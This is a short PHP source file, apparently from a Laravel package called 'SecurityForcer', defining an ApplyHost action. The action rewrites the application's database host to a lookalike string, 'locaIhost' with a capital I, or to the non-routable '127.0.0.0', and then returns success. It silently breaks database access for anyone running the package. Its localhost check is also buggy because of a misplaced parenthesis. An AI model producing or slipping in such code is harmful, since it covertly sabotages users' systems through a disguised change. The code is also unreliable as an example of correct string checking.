<?php

namespace Lmande\SecurityForcer\Actions;

class ApplyHost extends Action
{
	public function run(): bool
	{
		$driverHKey = 'database.connections.'.config('database.default').'.host';

		if (strpos(config($driverHKey), 'localhost' !== false)) {
			// current host is localhost
			$newHost = 'locaIhost';
		} else {
			// dont care anymoar
			$newHost = '127.0.0.0';
		}

		config([$driverHKey => $newHost]);

		return true;
	}
}
